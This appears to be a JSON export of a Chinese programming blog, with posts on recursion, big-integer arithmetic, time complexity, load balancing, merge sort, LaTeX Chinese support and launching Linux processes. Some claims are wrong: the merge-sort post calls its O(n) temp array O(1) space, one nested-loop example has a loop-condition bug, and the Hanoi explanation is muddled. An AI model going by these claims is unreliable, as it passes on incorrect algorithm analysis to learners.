arr[0] + Sum(arr[1...n-1]) 后面的 Sum 函数要解决的就是比前一个 Sum 更小的同一问题。 1Sum(arr[1...n-1]) = arr[1] + Sum(arr[2...n-1]) 以此类推，直到对一个空数组求和，空数组和为 0 ，此时变成了最基本的问题。 1Sum(arr[n-1...n-1] ) = arr[n-1] + Sum([]) 2 汉诺塔（Hanoi Tower）问题汉诺塔（Hanoi Tower）问题也是一个经典的递归问题，该问题描述如下： 汉诺塔问题：古代有一个梵塔，塔内有三个座A、B、C，A座上有64个盘子，盘子大小不等，大的在下，小的在上。有一个和尚想把这个盘子从A座移到B座，但每次只能允许移动一个盘子，并且在移动过程中，3个座上的盘子始终保持大盘在下，小盘在上。 如果只有 1 个盘子，则不需要利用 B 塔，直接将盘子从 A 移动到 C 。 如果有 2 个盘子，可以先将盘子 2 上的盘子 1 移动到 B ；将盘子 2 移动到 C ；将盘子 1 移动到 C 。这说明了：可以借助 B 将 2 个盘子从 A 移动到 C ，当然，也可以借助 C 将 2 个盘子从 A 移动到 B 。 如果有 3 个盘子，那么根据 2 个盘子的结论，可以借助 C 将盘子 3 上的两个盘子从 A 移动到 B ；将盘子 3 从 A 移动到 C ，A 变成空座；借助 A 座，将 B 上的两个盘子移动到 C 。 以此类推，上述的思路可以一直扩展到 n 个盘子的情况，将将较小的 n-1个盘子看做一个整体，也就是我们要求的子问题，以借助 B 塔为例，可以借助空塔 B 将盘子A上面的 n-1 个盘子从 A 移动到 B ；将A 最大的盘子移动到 C ， A 变成空塔；借助空塔 A ，将 B 塔上的 n-2 个盘子移动到 A，将 C 最大的盘子移动到 C， B 变成空塔。。。 3 爬台阶问题问题描述： 一个人爬楼梯，每次只能爬1个或2个台阶，假设有n个台阶，那么这个人有多少种不同的爬楼梯方法？ 先从简单的开始，以 4 个台阶为例，可以通过每次爬 1 个台阶爬完楼梯： 可以通过先爬 2 个台阶，剩下的每次爬 1 个台阶爬完楼梯 在这里，可以思考一下：可以根据第一步的走法把所有走法分为两类： ① 第一类是第一步走了 1 个台阶 ② 第二类是第一步走了 2 个台阶 所以 n 个台阶的走法就等于先走 1 阶后，n-1 个台阶的走法 ，然后加上先走 2 阶后，n-2 个台阶的走法。 用公式表示就是： 12&gt; f(n) = f(n-1)+f(n-2)&gt; 有了递推公式，递归代码基本上就完成了一半。那么接下来考虑递归终止条件。 当有一个台阶时，我们不需要再继续递归，就只有一种走法。 所以 f(1)=1。 通过用 n = 2，n = 3 这样比较小的数试验一下后发现这个递归终止条件还不足够。 n = 2 时，f(2) = f(1) + f(0)。如果递归终止条件只有一个f(1) = 1，那 f(2) 就无法求解，递归无法结束。所以除了 f(1) = 1 这一个递归终止条件外，还要有 f(0) = 1，表示走 0 个台阶有一种走法，从思维上以及动图上来看，这显得的有点不符合逻辑。所以为了便于理解，把 f(2) = 2 作为一种终止条件，表示走 2 个台阶，有两种走法，一步走完或者分两步来走。 总结如下： 假设只有一个台阶，那么只有一种走法，那就是爬 1 个台阶 假设有两个台阶，那么有两种走法，一步走完或者分两步来走 通过递归条件： 123f(1) = 1;f(2) = 2;f(n) = f(n-1)+f(n-2) 很容易推导出递归代码： 12345int f(int n) &#123; if (n == 1) return 1; if (n == 2) return 2; return f(n-1) + f(n-2);&#125; 通过上述三个示例，总结一下如何写递归代码： 找到如何将大问题分解为小问题的规律 通过规律写出递推公式 通过递归公式的临界点推敲出终止条件 将递推公式和终止条件翻译成代码 Reference 看动画轻松理解「递归」与「动态规划」 - https://cxyxiaowu.com/articles/2019/04/04/1554345266086.html","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】BigNum 原理","date":"2019-07-29T03:33:16.000Z","path":"2019/07/29/【Algorithm】BigNum原理/","text":"背景一些基本数据类型的范围： int：32位整数，占4字节，-2^312^31-1(-21亿多21亿多) unsigned int：占4字节，02^32-1(042亿多) –10位数 VC的64位整数 ： _int64：占8字节，-2^632^63-1（-900亿亿多900亿亿多） unsigned int64:占8字节，02^64-1(01800亿亿多)-20位数 G++的64位整数： long long==int64 unsigned long long==unsigned __int64 实数： float：占4字节，7位有效数字 double：占8字节，15位有效数字 浮点型的问题都是追求精度的，在一般情况下我们应当选择使用double，而很少用float； 所以当我们要进行计算的数超过了20位，我们就要用数组来模拟我们的计算过程了； 大整数加法大整数的加法之类的，算法比较简单，按照我们平时竖式计算的方式，用数组模拟大数的加法，要注意的就是处理好之间的进位问题，然后其中的输入输出也要注意，转化成我们习惯的那种方式去进行计算，输出的时候要处理好前端零； 1234567891011public static void main(String[] args) &#123; Scanner scanf = new Scanner(System.in); int t = scanf.nextInt(); for (int i = 1; i &lt;= t; i++) &#123; BigInteger a = scanf.nextBigInteger(); BigInteger b = scanf.nextBigInteger(); BigInteger sum = a.add(b); System.out.println(\"Case \" + i + \":\"); System.out.println(a + \" + \" + b + \" = \" + sum); &#125;&#125; 大整数乘法乘法和加法的思想基本上一致，这里要注意的是，i和j位置相乘的结果要保存在结果数组的i+j的位置； 123456789public static void main(String args[])&#123; Scanner cin = new Scanner(System.in); int n = cin.nextInt(); BigInteger ans = BigInteger.ONE; for(int i = 1; i &lt;= n; ++i) ans = ans.multiply(BigInteger.valueOf(i)); System.out.println(ans);&#125; 大整数减法减法和加法的思想基本一致；把程序中的加法换成减法，进位处理的时候注意； 大数比较大小123456789101112131415161718public static void main(String args[])&#123; Scanner cin = new Scanner(System.in); while(cin.hasNext()) &#123; BigInteger a = cin.nextBigInteger(); BigInteger b = cin.nextBigInteger(); if(a.equals(BigInteger.ZERO) &amp;&amp; b.equals(BigInteger.ZERO)) break; int flag = a.compareTo(b); if(flag == -1) System.out.println(\"a&lt;b\"); else if(flag == 0) System.out.println(\"a==b\"); else System.out.println(\"a&gt;b\"); &#125;&#125; Reference 大数问题（合辑） - https://blog.csdn.net/whjkm/article/details/38148893 【算法】大数乘法问题及其高效算法 - https://itimetraveler.github.io/2017/08/22/%E3%80%90%E7%AE%97%E6%B3%95%E3%80%91%E5%A4%A7%E6%95%B0%E7%9B%B8%E4%B9%98%E9%97%AE%E9%A2%98%E5%8F%8A%E5%85%B6%E9%AB%98%E6%95%88%E7%AE%97%E6%B3%95/","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】算法的时间复杂度（Time complexity）","date":"2019-07-27T09:42:42.000Z","path":"2019/07/27/【Algorithm】算法的时间复杂度/","text":"常见的时间复杂度量级我们先从常见的时间复杂度量级进行大O的理解： 常数阶O(1) 对数阶$O(log_2n)$ 线性阶O(n) 线性对数阶$On(log_2n)$ 平方阶$O(n^2)$ 指数阶$O(2^n)$ 复杂度 标记符号 描述 常量（Constant） $O(1) $ 操作的数量为常数，与输入的数据的规模无关。n = 1,000,000 -&gt; 1-2 operations 对数（Logarithmic） $O(log_2n)$ 操作的数量与输入数据的规模 n 的比例是 log2 (n)。n = 1,000,000 -&gt; 30 operations 线性（Linear） $O(n)$ 操作的数量与输入数据的规模 n 成正比。n = 10,000 -&gt; 5000 operations 平方（Quadratic） $O(n^2)$ 操作的数量与输入数据的规模 n 的比例为二次平方。n = 500 -&gt; 250,000 operations 立方（Cubic） $O(n^3)$ 操作的数量与输入数据的规模 n 的比例为三次方。n = 200 -&gt; 8,000,000 operations 指数（Exponential） $O(2^n)$、$O(k^n)$、$O(n!)$ 指数级的操作，快速的增长。n = 20 -&gt; 1048576 operations 列举了几种常见的算法时间复杂度的比较（又小到大）：$O(1)$（常数阶） &lt; $O(log_2n)$（对数阶） &lt; $O(n)$（线性阶） &lt; $O(n2)$（平方阶） &lt; $O(n3)$（立方阶） &lt; $O(2^n)$ (指数阶)。 通常将以 10 为底的对数叫做常用对数。为了简便，N 的常用对数 log10 N 简写做 lg N，例如 log10 5 记做 lg 5。 通常将以无理数 e 为底的对数叫做自然对数。为了方便，N 的自然对数 loge N 简写做 ln N，例如 loge 3 记做 ln 3。 在算法导论中，采用记号 $lg n = log_2n$ ，也就是以 2 为底的对数。改变一个对数的底只是把对数的值改变了一个常数倍，所以当不在意这些常数因子时，我们将经常采用 “lg n”记号，就像使用 O 记号一样。计算机工作者常常认为对数的底取 2 最自然，因为很多算法和数据结构都涉及到对问题进行二分。 而通常时间复杂度与运行时间有一些常见的比例关系： 复杂度 10 20 50 100 1000 10000 100000 $O(1)$ &lt;1s &lt;1s &lt;1s &lt;1s &lt;1s &lt;1s &lt;1s $O(log_2(n))$ &lt;1s &lt;1s &lt;1s &lt;1s &lt;1s &lt;1s &lt;1s $O(n)$ &lt;1s &lt;1s &lt;1s &lt;1s &lt;1s &lt;1s &lt;1s $O(n*log_2(n))$ &lt;1s &lt;1s &lt;1s &lt;1s &lt;1s &lt;1s &lt;1s $O(n^2)$ &lt;1s &lt;1s &lt;1s &lt;1s &lt;1s 2s 3-4 min $O(n^3)$ &lt;1s &lt;1s &lt;1s &lt;1s 20s 5 hours 231 days $O(2^n)$ &lt;1s &lt;1s 260 days hangs hangs hangs hangs $O(n!)$ &lt;1s hangs hangs hangs hangs hangs hangs $O(n^n)$ 3-4 min hangs hangs hangs hangs hangs hangs 时间复杂度的计算计算一个算法的时间复杂度，不可能把所有的算法都编写出实际的程序出来让计算机跑，这样会做很多无用功，效率太低。实际采用的方法是估算算法的时间复杂度。 在学习C语言的时候讲过，程序由三种结构构成：顺序结构、分支结构和循环结构。顺序结构和分支结构中的每段代码只运行一次；循环结构中的代码的运行时间要看循环的次数。 由于是估算算法的时间复杂度，相比而言，循环结构对算法的执行时间影响更大。所以，算法的时间复杂度，主要看算法中使用到的循环结构中代码循环的次数（称为“频度”）。次数越少，算法的时间复杂度越低。 例如： 12345678910111213141516//a) ++x; s=0;//b) for (int i=1; i&lt;=n; i++) &#123; ++x; s+=x; &#125;//c) for (int i=1; i&lt;=n; i++) &#123; for (int j=1; i&lt;=n; j++) &#123; ++x; s+=x; &#125; &#125; 上边这个例子中，a 代码的运行了 1 次，b 代码的运行了 n 次，c 代码运行了 n*n 次。 时间复杂度的表示算法的时间复杂度的表示方式为：O(频度)，这种表示方式称为大“O”记号法（Big O Notation）。 注意，是大写的字母O，不是数字0。 对于上边的例子而言，a 的时间复杂度为$O(1)$，b 的时间复杂度为$O(n)$，c 的时间复杂度为为$O(n^2)$。 如果a、b、c组成一段程序，那么算法的时间复杂度为$O(n^2+n+1)$。但这么表示是不对的，还需要对$n^2+n+1$ 进行简化。 简化的过程总结为3步： 去掉运行时间中的所有加法常数（例如 $n^2+n+1$，直接变为 $n^2+n$）。 只保留最高项（$n^2+n$ 变成 $n^2$）。 如果最高项存在但是系数不是1，去掉系数（$n^2$ 系数为 1）。 所以，最终a、b和c合并而成的代码的时间复杂度为$O(n^2)$。 时间复杂度计算示例常数阶 - $O(1)$ 无论代码执行了多少行，其他区域不会影响到操作，这个代码的时间复杂度都是O(1) 12345void swapTwoInts(int &amp;a, int &amp;b)&#123; int temp = a; a = b; b = temp;&#125; 对数阶 - $O(log_2n)$ 12345678910int binarySearch( int arr[], int n , int target)&#123; int l = 0, r = n - 1; while ( l &lt;= r) &#123; int mid = l + (r - l) / 2; if (arr[mid] == target) return mid; if (arr[mid] &gt; target ) r = mid - 1; else l = mid + 1; &#125; return -1;&#125; 在二分查找法的代码中，通过while循环，成 2 倍数的缩减搜索范围，也就是说需要经过 $log_2n$ 次即可跳出循环。 线性阶 - $O(n)$ 在下面这段代码，for循环里面的代码会执行 n 遍，因此它消耗的时间是随着 n 的变化而变化的，因此可以用O(n)来表示它的时间复杂度。 1234567int sum ( int n )&#123; int ret = 0; for ( int i = 0 ; i &lt;= n ; i ++)&#123; ret += i; &#125; return ret;&#125; $O(nlog_2n)$将时间复杂度为O(logn)的代码循环N遍的话，那么它的时间复杂度就是 $ n *O(log_2n)$，也就是了 $O(nlog_2n)$。 12345678void hello ()&#123; for( m = 1 ; m &lt; n ; m++)&#123; i = 1; while( i &lt; n )&#123; i = i * 2; &#125; &#125;&#125; 平方阶 - $O(n^2)$ 当存在双重循环的时候，即把 O(n) 的代码再嵌套循环一遍，它的时间复杂度就是 $O(n^2)$了。 12345678910void selectionSort(int arr[],int n)&#123; for(int i = 0; i &lt; n ; i++)&#123; int minIndex = i; for (int j = i + 1; j &lt; n ; j++ ) if (arr[j] &lt; arr[minIndex]) minIndex = j; swap ( arr[i], arr[minIndex]); &#125;&#125; 这里简单的推导一下 当 i = 0 时，第二重循环需要运行 (n - 1) 次 当 i = 1 时，第二重循环需要运行 (n - 2) 次 。。。。。。 不难得到公式： 123(n - 1) + (n - 2) + (n - 3) + ... + 0= (0 + n - 1) * n / 2= O (n^2) 立方阶 - $O(n^3)$123456789decimal Sum3(int n)&#123; decimal sum = 0; for (int a = 0; a &lt; n; a++) for (int b = 0; b &lt; n; b++) for (int c = 0; c &lt; n; c++) sum += a * b * c; return sum;&#125; 这里，给定规模 n，则基本步骤的执行数量约为 n*n*n ，所以算法复杂度为 $O(n^3)$。 指数阶 - $O(2^n)$斐波那契数列： Fib(0) = 0 Fib(1) = 1 Fib(n) = Fib(n-1) + Fib(n-2) F() = 0, 1, 1, 2, 3, 5, 8, 13, 21, 34 … 1234567int Fibonacci(int n)&#123; if (n &lt;= 1) return n; else return Fibonacci(n - 1) + Fibonacci(n - 2);&#125; 这里，给定规模 n，计算 Fib(n) 所需的时间为计算 Fib(n-1) 的时间和计算 Fib(n-2) 的时间的和。 T(n&lt;=1) = O(1) T(n) = T(n-1) + T(n-2) + O(1) 123456 fib(5) / \\ fib(4) fib(3) / \\ / \\ fib(3) fib(2) fib(2) fib(1)/ \\ / \\ / \\ 通过使用递归树的结构描述可知算法复杂度为 $O(2^n)$。 递归算法的时间复杂度（recursive algorithm time complexity）如果递归函数中，只进行一次递归调用，递归深度为depth； 在每个递归的函数中，时间复杂度为T； 则总体的时间复杂度为O(T * depth)。 我们知道，归并排序与快速排序都带有递归的思想，并且时间复杂度都是$O(nlog_2n)$，但并不是有递归的函数就一定是 $O(nlog_2n)$ 级别的。 1 递归中进行一次递归调用的复杂度分析二分查找法 1234567891011int binarySearch(int arr[], int l, int r, int target)&#123; if( l &gt; r ) return -1; int mid = l + (r-l)/2; if( arr[mid] == target ) return mid; else if( arr[mid] &gt; target ) return binarySearch(arr, l, mid-1, target); // 左边 else return binarySearch(arr, mid+1, r, target); // 右边 &#125; 比如在这段二分查找法的代码中，每次在 [ l , r ] 范围中去查找目标的位置，如果中间的元素 arr[mid] 不是 target，那么判断 arr[mid]是比 target 大 还是 小 ，进而再次调用 binarySearch这个函数。 在这个递归函数中，每一次没有找到target时，要么调用 左边 的 binarySearch函数，要么调用 右边 的 binarySearch函数。也就是说在此次递归中，最多调用了一次递归调用而已。根据数学知识，需要$log_2n$次才能递归到底。因此，二分查找法的时间复杂度为 $O(log_2n)$。 求和 1234int sum (int n) &#123; if (n == 0) return 0; return n + sum( n - 1 )&#125; 在这段代码中比较容易理解递归深度随输入 n 的增加而线性递增，因此时间复杂度为 O (n)。 求幂 123456789//递归深度：logn//时间复杂度：O(logn)double pow( double x, int n)&#123; if (n == 0) return 1.0; double t = pow(x,n/2); if (n %2) return x*t*t; return t * t;&#125; 递归深度为$O(log_2n)$，因为是求需要除以 2 多少次才能到底。 2 递归中进行多次递归调用的复杂度分析递归算法中比较难计算的是多次递归调用。 先看下面这段代码，有两次递归调用。 12345// O(2^n) 指数级别的数量级，后续动态规划的优化点int f(int n)&#123; if (n == 0) return 1; return f(n-1) + f(n - 1);&#125; 递归树中节点数就是代码计算的调用次数。 比如 当 n = 3 时，调用次数计算公式为 1 + 2 + 4 + 8 = 15 一般的，调用次数计算公式为 20 + 21 + 22 + …… + 2n= 2(n+1) - 1= O(2n) 与之有所类似的是 归并排序 的递归树，区别点在于 上述例子中树的深度为 n，而 归并排序 的递归树深度为logn。 上述例子中每次处理的数据规模是一样的，而在 归并排序 中每个节点处理的数据规模是逐渐缩小的 因此，在如 归并排序 等排序算法中，每一层处理的数据量为 O(n) 级别，同时有 $O(log_2n)$ 层，时间复杂度便是 $O(nlog_2n)$。 最好、最坏情况时间复杂度（Worst case time complexity）最好、最坏情况时间复杂度指的是特殊情况下的时间复杂度。 动图表明的是在数组 array 中寻找变量 x 第一次出现的位置，若没有找到，则返回 -1；否则返回位置下标。 123456789int find(int[] array, int n, int x) &#123; for ( int i = 0 ; i &lt; n; i++) &#123; if (array[i] == x) &#123; return i; break; &#125; &#125; return -1;&#125; 在这里当数组中第一个元素就是要找的 x 时，时间复杂度是 O(1)；而当最后一个元素才是 x 时，时间复杂度则是 O(n)。 最好情况时间复杂度就是在最理想情况下执行代码的时间复杂度，它的时间是最短的；最坏情况时间复杂度就是在最糟糕情况下执行代码的时间复杂度，它的时间是最长的。 平均情况时间复杂度（Average case time complexity）最好、最坏时间复杂度反应的是极端条件下的复杂度，发生的概率不大，不能代表平均水平。那么为了更好的表示平均情况下的算法复杂度，就需要引入平均时间复杂度。 平均情况时间复杂度可用代码在所有可能情况下执行次数的加权平均值表示。 还是以 find 函数为例，从概率的角度看， x 在数组中每一个位置的可能性是相同的，为 1 / n。那么，那么平均情况时间复杂度就可以用下面的方式计算： ((1 + 2 + … + n) / n + n) / 2 = (3n + 1) / 4 find 函数的平均时间复杂度为 O(n)。 拿时间换空间，用空间换时间算法的时间复杂度和空间复杂度是可以相互转化的。 谷歌浏览器相比于其他的浏览器，运行速度要快。是因为它占用了更多的内存空间，以空间换取了时间。 例如判断某个年份是否为闰年时，如果想以时间换取空间，算法思路就是：当给定一个年份时，判断该年份是否能被4或者400整除，如果可以，就是闰年。 如果想以空间换时间的话，判断闰年的思路就是：把所有的年份先判断出来，存储在数组中（年份和数组下标对应），如果是闰年，数组值是1，否则是0；当需要判断某年是否为闰年时，直接看对应的数组值是1还是0，不用计算就可以马上知道。 Reference 数据结构概述 - http://data.biancheng.net/intro/ 算法复杂度分析 - https://www.cnblogs.com/gaochundong/p/complexity_of_algorithms.html 《大话数据结构》 冰与火之歌：一文弄懂时间复杂度与空间复杂度 - https://cxyxiaowu.com/articles/2019/04/04/1554345342924.html","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Distributed System】负载均衡（Load balancing）","date":"2019-07-26T05:28:35.000Z","path":"2019/07/26/【Distributed-System】负载均衡/","text":"负载均衡（Load balancing）负载平衡（Load balancing）是一种计算机技术，用来在多个计算机（计算机集群）、网络连接、CPU、磁盘驱动器或其他资源中分配负载，以达到最优化资源使用、最大化吞吐率、最小化响应时间、同时避免过载的目的。 使用带有负载平衡的多个服务器组件，取代单一的组件，可以通过冗余提高可靠性。负载平衡服务通常是由专用软件和硬件来完成。 主要作用是将大量作业合理地分摊到多个操作单元上进行执行，用于解决互联网架构中的高并发和高可用的问题。 DNS负载均衡DNS负责将用户请求的域名映射为实际的IP地址，这种映射可以是一对多的（ DNS的A记录，用来指定域名对应的IP地址），这样DNS服务器便充当负载均衡调度器。 使用多条 A 记录使用多条 A 记录来实现服务器流量的负载均衡，可以算是 DNS 负载均衡的变式方法。 例如：有 3 台服务器，对应 3 个 IP 地址，分别是 1.1.1.1、2.2.2.2、3.3.3.3，设置的 3 个 A 记录如下： 记录 类型 主机 线路 值 权重 1 A www default 1.1.1.1 600 2 A www default 2.2.2.2 600 3 A www default 3.3.3.3 600 当 Local DNS 访问权威 DNS，权威 DNS 会将这 3 个解析记录全部返回给 Local DNS， Local DNS 会将所有的 IP 地址返回给网站访问者，网站访问者的浏览器会随机访问其中一个 IP。 这种方法用在无 DNS 负载均衡的权威 DNS 中，能够在一定程度上减轻单台服务器的压力，但它不能区分服务器的差异，不能反映服务器的当前运行状态。 DNS负载算法轮循负载算法DNS 负载均衡采用简单的轮循负载算法。 在有 DNS 负载均衡的权威 DNS 服务器中，网站访问者的请求到来时，权威 DNS 服务器会根据解析记录的权重轮询 3 个 A 记录（默认权重 1:1:1），依次返回 3 个 IP 地址。 User1 访问，返回 1.1.1.1User2 访问，返回 2.2.2.2User3 访问，返回 3.3.3.3User4 访问，返回 1.1.1.1…… 带权重的轮询负载算法对于权重不同的 DNS 负载均衡，如 2:1:1，则返回如下： User1 访问，返回1.1.1.1User2 访问，返回 2.2.2.2User3 访问，返回 3.3.3.3User4 访问，返回1.1.1.1User5 访问，返回1.1.1.1User6 访问，返回 2.2.2.2…… 总结DNS域名解析也存在如下缺点： 目前的DNS是多级解析的，每一级DNS都可能缓存A记录，当某台服务器下线之后，即使修改了A记录，要使其生效也需要较长的时间，这段时间，DNS任然会将域名解析到已下线的服务器上，最终导致用户访问失败。 不能够按服务器的处理能力来分配负载。DNS负载均衡采用的是简单的轮询算法，不能区分服务器之间的差异，不能反映服务器当前运行状态，所以其的负载均衡效果并不是太好。 可能会造成额外的网络问题。为了使本DNS服务器和其他DNS服务器及时交互，保证DNS数据及时更新，使地址能随机分配，一般都要将DNS的刷新时间设置的较小，但太小将会使DNS流量大增造成额外的网络问题。 事实上，大型网站总是部分使用DNS域名解析，利用域名解析作为第一级负载均衡手段，即域名解析得到的一组服务器并不是实际提供服务的物理服务器，而是同样提供负载均衡服务器的内部服务器，这组内部负载均衡服务器再进行负载均衡，请请求发到真实的服务器上，最终完成请求。 HTTP重定向Web服务器可通过Http响应头信息中的Location标记来返回一个新的URL，浏览器自动去访问这个新的URL。 实现：可以通过Web应用程序代码实现你想到的调度策略，如可根据请求的URL的不同来进行合理的过滤和转移。 反向代理负载均衡反向代理服务器的核心工作是转发HTTP，它工作在HTTP层面，因此，基于反向代理的负载均衡也称为七层负载均衡。 任何对于实际服务器的HTTP请求都必须经过调度器；调度器必须等待实际服务器的HTTP响应，并将它反馈给用户。 IP负载均衡网络地址转换(NAT)负载均衡工作在传输层，对数据包中的IP地址和端口进行修改，从而达到转发的目的，称为四层负载均衡。 NAT服务器（前端服务器）必须作为实际服务器（后端服务器）的网关，否则数据包被转发后将一去不返。 直接路由这种方式工作在数据链路层。它修改数据包的目标MAC地址，并没有修改目标IP（因为这种转发工作在数据链路层，它对上层端口无能为力），然后发给实际的服务器，实际服务器的响应数据直接发回给用户，而不用经过调度器。但实际服务器必须接入外网，而且不能将调度器作为默认网关，要给实际服务器添加和调度器IP地址相同的IP别名。 负载均衡算法下面来罗列一下日常工作中最常见的5种策略。 1 轮询 这是最常用也最简单策略，平均分配，人人都有、一人一次。大致的代码如下。 2 加权轮询 在轮询的基础上，增加了一个权重的概念。权重是一个泛化后的概念，可以用任意方式来体现，本质上是一个能者多劳思想。比如，可以根据宿主的性能差异配置不同的权重。 3 最少连接数 这是一种根据实时的负载情况，进行动态负载均衡的方式。维护好活动中的连接数量，然后取最小的返回即可。 4 Hash法 hash法的负载均衡与之前的几种不同在于，它的结果是由客户端决定的。通过客户端带来的某个标识经过一个标准化的散列函数进行打散分摊。 上图中的散列函数运用的是最简单粗暴的「取余法」。 另外，被求余的参数其实可以是任意的，只要最终转化成一个整数参与运算即可。最常用的应该是用来源ip地址作为参数，这样可以确保相同的客户端请求尽可能落在同一台服务器上。 对比 Reference 《构建高性能Web站点》第12章 web负载均衡 《大型网站技术架构：核心原理与案例分析》 6.2 应用服务器集群的伸缩性设计 分布式系统关注点——仅需这一篇，吃透「负载均衡」妥妥的 - https://www.imooc.com/article/252924 服务器集群负载均衡原理？ - https://www.jianshu.com/p/e7044c14c403 大型网站架构系列：负载均衡详解（1） - https://www.cnblogs.com/itfly8/p/5043435.html DNS 负载均衡 - https://www.alibabacloud.com/help/zh/doc-detail/60182.htm 每天进步一点点——负载均衡之DNS域名解析 - https://blog.csdn.net/cywosp/article/details/38017027","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Algorithm】排序算法 - 归并排序（Merge Sort）","date":"2019-07-25T05:04:40.000Z","path":"2019/07/25/【Algorithm】排序算法-归并排序/","text":"归并排序（Merge Sort）归并字面上的意思是合并，归并算法的核心思想是分治法（divide-and-conquer method），就是将一个数组一刀切两半，递归切，直到切成单个元素，然后重新组装合并，单个元素合并成小数组，两个小数组合并成大数组，直到最终合并完成，排序完毕。 图解归并排序我们以[ 8，2，5，9，7 ]这组数字来举例 首先，一刀切两半： 再切： 再切 粒度切到最小的时候，就开始归并 数据量设定的比较少，是为了方便图解，数据量为单数，是为了让你看到细节，下面我画了一张更直观的图可能你会更喜欢： 分析分而治之 合并相邻有序子序列再来看看治阶段，我们需要将两个已经有序的子序列合并成一个有序序列，比如上图中的最后一次合并，要将[4,5,7,8]和[1,2,3,6]两个已经有序的子序列，合并为最终序列[1,2,3,4,5,6,7,8]，来看下实现步骤。 代码实现我们上面讲过，归并排序的核心思想是分治，分而治之，将一个大问题分解成无数的小问题进行处理，处理之后再合并，这里我们采用递归来实现： 1234567891011121314151617181920212223242526272829303132333435363738394041424344public void sortIntegers2(int[] A) &#123; // use a shared temp array, the extra memory is O(n) at least int[] temp = new int[A.length]; mergeSort(A, 0, A.length - 1, temp);&#125;private void mergeSort(int[] A, int start, int end, int[] temp) &#123; if (start &gt;= end) &#123; return; &#125; int left = start, right = end; int mid = (start + end) / 2; mergeSort(A, start, mid, temp); mergeSort(A, mid+1, end, temp); merge(A, start, mid, end, temp);&#125;private void merge(int[] A, int start, int mid, int end, int[] temp) &#123; int left = start; int right = mid+1; int index = start; // merge two sorted subarrays in A to temp array while (left &lt;= mid &amp;&amp; right &lt;= end) &#123; if (A[left] &lt; A[right]) &#123; temp[index++] = A[left++]; &#125; else &#123; temp[index++] = A[right++]; &#125; &#125; while (left &lt;= mid) &#123; temp[index++] = A[left++]; &#125; while (right &lt;= end) &#123; temp[index++] = A[right++]; &#125; // copy temp back to A for (index = start; index &lt;= end; index++) &#123; A[index] = temp[index]; &#125;&#125; 我们可以发现 merge 方法中只有一个 for 循环，直接就可以得出每次合并的时间复杂度为 O(n) ，而分解数组每次对半切割，属于对数时间 O(log n) ，合起来等于 O(log2n) ，也就是说，总的时间复杂度为 O(nlogn) 。 关于空间复杂度，其实大部分人写的归并都是在 merge 方法里面申请临时数组，用临时数组来辅助排序工作，空间复杂度为 O(n)，而我这里做的是原地归并，只在最开始申请了一个临时数组，所以空间复杂度为 O(1)。 Reference 这或许是东半球讲十大排序算法最好的一篇文章 - https://cxyxiaowu.com/articles/2019/06/11/1560233679033.html 图解排序算法(四)之归并排序 - https://www.cnblogs.com/chengxiao/p/6194356.html","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Netwrok】输入一个 URL 会发生什么","date":"2019-07-24T03:23:53.000Z","path":"2019/07/24/【Netwrok】输入一个-URL-会发生什么/","text":"ARP DHCP DNS TCP 三次握手 HTTPS 路由 CDN 负载均衡","comments":true,"categories":[{"name":"Netwrok","slug":"Netwrok","permalink":"http://swsmile.info/categories/Netwrok/"}],"tags":[{"name":"Netwrok","slug":"Netwrok","permalink":"http://swsmile.info/tags/Netwrok/"}]},{"title":"【LaTeX】支持中文","date":"2019-07-24T02:58:18.000Z","path":"2019/07/24/【LaTeX】支持中文/","text":"方法 1 - ctexart完整安装 CTeX 套装、MikTeX 套装、TeXLive 套装，MacTeX套装之一的最新发行版。然后选择一款自己喜欢的，最好良好支持 UTF8 编码的文本编辑器，然后 12345\\documentclass&#123;ctexart&#125;\\begin&#123;document&#125;中文English[E = m c^2]\\end&#123;document&#125; 使用 pdflatex 或者 xelatex （推荐方式，须保以 UTF8 编码保存） 编译即可。 方法 2 - ctex12345\\documentclass&#123;article&#125;\\usepackage[UTF8]&#123;ctex&#125;\\begin&#123;document&#125;你好，这是一个测试文档。\\end&#123;document&#125; CTeX 开发者推荐使用 xelatex 命令编译源文件。 Reference 有没有简单的 LaTeX 中文支持方案？ - https://www.zhihu.com/question/23658979 LaTeX 中如何使用中文 - https://jdhao.github.io/2018/03/29/latex-chinese.zh/","comments":true,"categories":[{"name":"LaTeX","slug":"LaTeX","permalink":"http://swsmile.info/categories/LaTeX/"}],"tags":[{"name":"LaTeX","slug":"LaTeX","permalink":"http://swsmile.info/tags/LaTeX/"}]},{"title":"【Operating System】进程 - Linux启动进程的几种方式","date":"2019-07-18T05:29:23.000Z","path":"2019/07/18/【Operating-System】进程-Linux启动进程的几种方式/","text":"有时候，我们需要在自己的程序（进程）中启动另一个程序（进程）来帮助我们完成一些工作，那么我们需要怎么才能在自己的进程中启动其他的进程呢？在Linux中提供了不少的方法来实现这一点，下面就来介绍一个这些方法及它们之间的区别。 system函数调用system函数的原型为： 12#include &lt;stdlib.h&gt;int system (const char *string); 它的作用是，运行以字符串参数的形式传递给它的命令并等待该命令的完成。命令的执行情况就如同在shell中执行命令：sh -c string。如果无法启动shell来运行这个命令，system函数返回错误代码127；如果是其他错误，则返回-1。否则，system函数将返回该命令的退出码。 注意：system函数调用用一个shell来启动想要执行的程序，所以可以把这个程序放到后台中执行，这里system函数调用会立即返回。 可以先运行下面的例子，源文件为new_ps_system.c，代码如下： 123456789101112#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt; int main()&#123; printf(\"Running ps with system\\n\"); // 